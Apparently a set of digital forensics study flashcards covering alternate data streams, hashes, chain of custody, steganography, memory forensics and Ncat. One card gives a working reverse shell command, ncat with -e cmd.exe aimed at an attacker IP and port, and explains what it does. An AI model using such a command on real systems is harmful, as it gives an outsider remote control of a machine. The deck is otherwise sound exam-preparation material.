Alternate Data Streams,Use command: <samp>dir /r</samp> to reveal ADS hidden in files.
Authentication Methods,<ul><li>MD5  (128-bit)</li><li>SHA-1  (160-bit) </li><li>SHA-2 (256/512-bit)</li></ul>
Chain of Custody,"<ul><li>A chain of custody is a written record consisting of all the processes involved in the seizure, custody, control, transfer, analysis, and disposition of physical or electronic device.</li><li>It includes the details of people, time, and purpose involved in the investigation and evidence maintenance processes.</li><li>It tracks the collected evidence closely so as to preserve its integrity.</li></ul>"
Challenges in live forensics,High speed and large volumes of data that modern day computers produce; speed and ability of the forensics team.
Destroying messages hidden in LSB,<ul><li>Randomly flipping the LSB</li><li>Compression Attack (Compress the image)</li><li>Save the photo in another format (e.g. JPG to PNG)</li></ul>
File types of steganography,"<ul><li><b>Image Steganography</b>: JPEG/JFIF (.jpg, .jpeg), .png, .bmp, .tiff, .webp, .gif)</li><li><b>Audio Steganography</b>: .wav, .mp3, .avi</li><li><b>Video Steganography</b>: .mp4, .mov, .wmv, .webm, .flv</li></ul>"
Hash Value,"<ul><li>In Computer Forensics, hashes are used to uniquely identify a specific file (e.g. legitimate software, malware, etc.) or disk drive.  The hash value generated from a file becomes its ""digital fingerprint"".  MD5 and SHA1 are two common hash algorithms used in computer forensics.</li><li>Hash codes can be used to quickly match files found during your investigations to lists of ""Known Files"" maintained by the Government and Law Enforcement Agencies.</li></ul>"
How to handle hard drives,<ul><li>Perform bit-stream imaging of the mathematic hard drive. Conduct his investigation on the duplicate image.</li><li> Ensures that the chain of custody is in order and the magnetic hard drive is secured and accountable at all times during different stages of his investigation.</li></ul><br>Related questions:<i><ul><li>A forensic investigator was instructed to work on a seized magnetic hard drive. What actions should he take on the hard drive so that he can accurately conduct his investigation? Select the best TWO answers.</li></ul></i>
It is not possible to perform bit-stream duplication using just the tool...,Tableau Forensic SATA/IDE Bridge
Memory Forensics,Forensic analysis of a computer’s memory dump. Analyses RAM.
Ncat,"Networking utility that reads & writes data across networks from the command line. Uses include: Check if port is opened on a remote machine, chatting, transfer/copy files, remote shell"
ncat -nv 192.168.1.12 4444 -e cmd.exe,Instructs machine to connect to the attacker at IP 192.168.1.12 and port 4444 and gives control of shell/command prompt.
ncat options,-n: Do not resolve hostnames via DNS; -l: Bind and listen for incoming connections; -v: Set verbosity level; -p: port
